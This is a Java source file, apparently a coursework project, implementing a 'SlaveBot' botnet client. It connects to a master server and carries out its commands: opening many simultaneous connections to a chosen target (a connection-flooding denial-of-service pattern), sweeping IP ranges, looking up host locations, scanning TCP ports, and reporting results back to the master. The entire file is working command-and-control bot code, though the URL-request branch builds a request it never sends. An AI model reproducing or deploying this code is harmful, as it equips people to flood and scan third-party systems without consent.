//AKSHAY RAJ BASAVANAGUDI RAJENDRA


import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.*;
import java.net.*;
import java.util.*;



public class SlaveBot
{
	String sMasterIP;
	int nMasterPort;
	BufferedReader br;
	
	ArrayList<Socket> targets = null;
	
	public SlaveBot()
	{
		targets = new ArrayList<Socket>();
	}
	
	void findAndDisconnectTargetConnsBy(String sTargetHostNameOrIP, String sPorts)
	{
		Iterator<Socket> it = targets.iterator();
		while(it.hasNext())
		{
			Socket targetConn = it.next();
			if((targetConn.getInetAddress().getHostAddress().compareTo(sTargetHostNameOrIP) == 0
					|| targetConn.getInetAddress().getHostName().compareTo(sTargetHostNameOrIP) == 0))
			{
				if(sPorts.equals("all")
						|| targetConn.getPort() == Integer.parseInt(sPorts))
				{
					
					try
					{
						targets.remove(targetConn);
						System.out.println("Disconnecting " + targetConn.getInetAddress().getHostName());
						targetConn.close();
						it = targets.iterator();
						System.out.println("Disconnected\n");
				    }
					catch (IOException e)
					{
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				else
				{
					System.out.println("ERROR entry not found");
				}
			}
		}
	}
	
	public static void main(String[] args) {
		
	
		SlaveBot slaveBot = new SlaveBot();
		/** java slavebot.SlaveBot -h MasterIP -p MasterPort */
		if(args[0].compareTo("-h") == 0)
		{
			slaveBot.sMasterIP = new String(args[1]);
		}
		if(args[2].compareTo("-p") == 0)
		{
			slaveBot.nMasterPort = Integer.parseInt(args[3]);
		}	
		
		/** connect this slave to sMasterIP + nMasterPort */
		try
		{
			String cmdFromMaster = null;
			Socket clientToMasterConn = new Socket(slaveBot.sMasterIP, slaveBot.nMasterPort);
			System.out.println("connected to " + slaveBot.sMasterIP + " at " + slaveBot.nMasterPort);
			/** now connection is made to the master
			 * Next:
			 * wait for commands from master:
			 *  */
			slaveBot.br = new BufferedReader(new InputStreamReader(clientToMasterConn.getInputStream()));
			boolean continueProcessingMasterCmds = true;
			do
			{
			     /** understand/parse the cmd from master and process it */
				cmdFromMaster = slaveBot.br.readLine();
			    /** parse cmdFromMaster and do the needful */
			    if(cmdFromMaster.startsWith("connect"))
			    {
			    	/** we need to connect to a target host
			    	 * format:
			    	 * connect (IPAddressOrHostNameOfYourSlave|all) (TargetHostName|IPAddress) 
			    	 * TargetPortNumber[n/1] */
			    	String[] tokens = cmdFromMaster.split("\\s+");
			    	String str = tokens[4]; // for keepalive and url
			    	String sTargetHopstNameOrIP = tokens[2];
			    	tokens[3] = tokens[3].replace('[', ' ');
			    	tokens[3] = tokens[3].replace(']', ' ');
			    	
			    	String[] portAndN = tokens[3].split("\\s+");
			    	
			    	int nTargetPort = Integer.parseInt(portAndN[0]);
			    	int nNumOfConnectionDesired = 1;
			    	if(portAndN.length > 1)
			    	{
			    	     nNumOfConnectionDesired = Integer.parseInt(portAndN[1]) > 0 ? Integer.parseInt(portAndN[1]) : 1;
			    	}
			    	/** just connect to the target host */
			    	Socket connToTarget = null;
			    	for(int i = 0; i < nNumOfConnectionDesired; i++)
			    	{
			    		try
			    		{
			    			connToTarget = new Socket(InetAddress.getByName(sTargetHopstNameOrIP), nTargetPort);
			    			slaveBot.targets.add(connToTarget);
			    			System.out.println("we just connected to " + connToTarget.getInetAddress().getHostName() + " " + connToTarget.getInetAddress().getHostAddress());
			    			if(str.equals("keepalive")) 
                            {	
                            	connToTarget.setKeepAlive(true); // keepalive is set
                            }
                            else if(str.equals("url=/#q="))
                            {
                            	String[] splitstr = str.split("/");
                            	String str1 = splitstr[0];
                            	String str2 = splitstr[1]; // to get "#q=" and storing 
                            	// Random String Generation
                            	char[] chars = "abcdefghijklmnopqrstuvwxyz".toCharArray();
                            	StringBuilder sb = new StringBuilder();
                            	int s;
                            	Random random = new Random();
                            	s = random.nextInt(10); 
                            	if(s <= 1)
                            	{
                            		s = 2;
                            	}
                            	for(i = 1; i < s; i++)
                            	{
                            		char c =chars[random.nextInt(chars.length)];
                            		sb.append(c);
                            	}
                            	String rand = ""; 
                            	String str_req = "";
                            	rand = sb.toString();
                            	str_req = tokens[2] + "/" + str2 + rand;
                            	System.out.println("google http String:" + str_req);
                            	PrintWriter write = new PrintWriter(connToTarget.getOutputStream()); // for cleaning the data
                            	System.out.println("Before : " + write);
                            	write.flush(); // cleaning the data
                            	System.out.println("After : " + write);
                            }
			    		}catch(Exception e){System.out.println("Sorry could not connect, exception is " + e);}
			    		/** a connection is made to target host */
			    	}
			    }
			    
			    else if(cmdFromMaster.startsWith("ipscan") || cmdFromMaster.startsWith("geoipscan"))
			    {
			    	ArrayList<String> commandsip = new ArrayList<String>();
			    	String IPString = "";
			    	String[] tokens = cmdFromMaster.split("\\s+");
			    	String[] str = tokens[2].split("-");
			    	String parts1 = str[0];
			    	String parts2 = str[1];
			    	String[] toStringparts1 = parts1.split("\\.");
			    	String[] toStringparts2 = parts2.split("\\.");
                    String output="";
			    	long res1 = 0;
			    	long res2 = 0;
			    	int flag = 0;
			    	for(int i = 0; i < toStringparts1.length; i++)
			    	{
			    		int power = 3 - i;
			    		int ip = Integer.parseInt(toStringparts1[i]);
			    		res1 += ip * Math.pow(256, power);
			    	}
			    	for(int i = 0;i < toStringparts2.length; i++)
			    	{
			    		int power = 3 - i;
			    		int ip = Integer.parseInt(toStringparts2[i]);
			    		res2 += ip * Math.pow(256, power);
			    	}
			    	for(long m = res1 ; m <= res2 ; m++)
			    	{
			    		StringBuilder sbuild = new StringBuilder(15);
			    		long res = m;
			    		for(int i = 0; i < 4;i++)
			    		{
			    			sbuild.insert(0, Long.toString(res & 0xff));
			    			if(i < 3)
			    			{
			    				sbuild.insert(0, '.');
			    			}
			    			res = res >> 8;
			    			
			    		}
			    		try
			    		{
			    			String IPAddress = sbuild.toString();
			    			InetAddress address = InetAddress.getByName(IPAddress);
			    			if(address.isReachable(200))
			    			{
                                if(cmdFromMaster.startsWith("geoipscan"))
                                {
                                    try
                                    {
                                        System.out.println(IPAddress);
                                        StringBuilder result = new StringBuilder();
                                        URL url = new URL("http://ip-api.com/csv/" + IPAddress);
                                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                                        conn.setRequestMethod("GET");
                                        BufferedReader read = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                                        String line;
                                        while((line = read.readLine()) != null)
                                        {
                                            result.append(line);
                                        }
                                        read.close();
                                        output = IPAddress + " " + result.toString() + "\n";
                                    }catch(Exception e) { System.out.println("Error, Please try again"); }
                                }
                                else
                                    commandsip.add(IPAddress);
			    				flag = 1;
			    			}
			    		}catch(Exception e) {System.out.println("Exception is " + e);}
			    	}
			    	
			    	if(flag == 1)
	    			{
	    				PrintWriter pw = new PrintWriter(clientToMasterConn.getOutputStream());
                        if(cmdFromMaster.startsWith("ipscan"))
	    				pw.println(commandsip);
                        else
                        pw.println(output);
	    				pw.flush();
	    			}
			    	
			    }
			    else if(cmdFromMaster.startsWith("tcpportscan"))
			    {
			    	System.out.println(cmdFromMaster);
			    	String[] tokens = cmdFromMaster.split("\\s+");
			    	String[] str = tokens[3].split("-");
			    	try
			    	{
			    		String string = null;
			    		String temp = "";
			    		int flag = 0;
			    		int first = Integer.parseInt(str[0]);
					    int last = Integer.parseInt(str[1]);
					    for(int i = first;i <= last;i++)
					    {
					    	String tgt = tokens[2];
					    	int num = i;
					    	Socket socket = null;
					        String string2 = null;
					        try
					        {
					        	socket = new Socket();
					        	socket.setReuseAddress(true);
					        	SocketAddress addr = new InetSocketAddress(tgt, num);
					        	socket.connect(addr,500);
					        }catch(Exception e) {}
					    	finally
					    	{
					    		if(socket != null)
					    		{
					    			if(socket.isConnected())
					    			{
					    				if(i < last)
					    					temp = temp + i + ",";
					    				else
					    					temp+=temp+".";
					    			}
					    			try
					    			{
					    				socket.close();
					    			}catch(Exception e) {}
					    		}
					    	}
					    }
					    PrintWriter pw = new PrintWriter(clientToMasterConn.getOutputStream());
		    		    pw.println(temp);
		    			pw.flush();
		    		}catch(Exception e) {System.out.println("Exception is " + e);}
			    }
			    
			    else if(cmdFromMaster.startsWith("disconnect"))
			    {
			    	/** -disconnect (IPAddressOrHostNameOfYourSlave|all) 
			    	 * (TargetHostName|IPAddress) [TargetPort:all if no port specified] 
			    	 *  (TargetHostName|IPAddress) TargetPort */
			    	String[] tokens = cmdFromMaster.split("\\s+");
			    	if(tokens.length >= 4)
			    	{
			    		slaveBot.findAndDisconnectTargetConnsBy(tokens[2], tokens[3]);
			    	}
			    	else
			    	{
			    		System.out.println("Invalid command");
			    	}
			    }
			    else
			    {
			    	System.out.println("Sorry, unidentified command from master");
			    }
			}while(continueProcessingMasterCmds);
			clientToMasterConn.close();
		}catch(Exception e) {System.out.println("Exception is " + e);}
	}
}
